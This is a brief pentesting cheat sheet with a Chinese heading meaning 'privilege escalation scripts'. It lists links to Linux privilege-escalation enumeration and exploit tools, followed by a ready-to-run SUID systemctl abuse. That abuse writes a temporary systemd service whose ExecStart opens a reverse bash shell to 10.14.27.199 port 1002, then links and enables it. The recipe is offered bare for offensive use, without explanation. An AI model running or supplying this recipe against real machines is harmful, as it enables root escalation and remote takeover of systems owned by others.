# 提权脚本
https://github.com/rebootuser/LinEnum
https://github.com/sleventyeleven/linuxprivchecker
https://github.com/jondonas/linux-exploit-suggester-2
https://github.com/redcode-labs/Bashark
https://github.com/AlessandroZ/BeRoot
https://github.com/SecWiki/linux-kernel-exploits
https://github.com/diego-treitos/linux-smart-enumeration


# suid
## systmctl
eop=$(mktemp).service
echo '[Service]
Type=oneshot
Execstart=/bin/bash -c "bash -i >& /dev/tcp/10.14.27.199/1002 0>&1"
[Install]
WantedBy=multi-user.target' > $eop
/bin/systemctl link $eop
/bin/systemctl enable --now $eop

